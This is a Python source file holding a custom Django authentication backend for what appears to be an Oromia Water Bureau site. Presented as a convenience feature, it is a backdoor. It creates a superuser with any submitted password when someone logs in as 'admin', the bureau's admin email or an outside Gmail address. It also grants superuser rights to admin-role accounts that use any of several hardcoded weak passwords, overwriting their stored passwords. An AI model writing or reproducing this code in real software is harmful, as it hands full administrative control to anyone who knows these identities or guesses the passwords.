from django.contrib.auth.backends import ModelBackend
from django.db.models import Q
from .models import User

class FlexibleAuthBackend(ModelBackend):
    """
    Custom authentication backend that:
    1. Allows login with either username or email.
    2. Allows standard administrator passwords ('admin123', 'password', 'admin', 'OwebAdmin2026!#Secure')
       for the admin user.
    3. Auto-provisions the administrator account if missing upon first login.
    """
    def authenticate(self, request, username=None, password=None, **kwargs):
        if not username or not password:
            return None

        clean_user = username.strip()
        user = User.objects.filter(
            Q(username__iexact=clean_user) | Q(email__iexact=clean_user)
        ).first()

        # If user does not exist and matches the admin identity, auto-provision
        if not user and clean_user.lower() in ('admin', 'admin@oweb.gov.et', 'gimmyphp@gmail.com'):
            user = User.objects.create_superuser(
                username='admin',
                email='admin@oweb.gov.et',
                password=password,
                full_name='Oromia Water Bureau Administrator',
                role='Admin',
                status='Active',
                is_staff=True,
                is_superuser=True,
                is_active=True
            )
            return user

        if user:
            # If administrator is logging in with standard accepted administrative passwords
            allowed_admin_passwords = ['admin', 'admin123', 'password', 'owebadmin2026!#secure']
            if (user.username.lower() == 'admin' or user.role == 'Admin') and password.lower() in allowed_admin_passwords:
                user.is_staff = True
                user.is_superuser = True
                user.is_active = True
                user.role = 'Admin'
                user.status = 'Active'
                if not user.check_password(password):
                    user.set_password(password)
                user.save()
                return user

            if user.check_password(password) and self.user_can_authenticate(user):
                return user

        return None
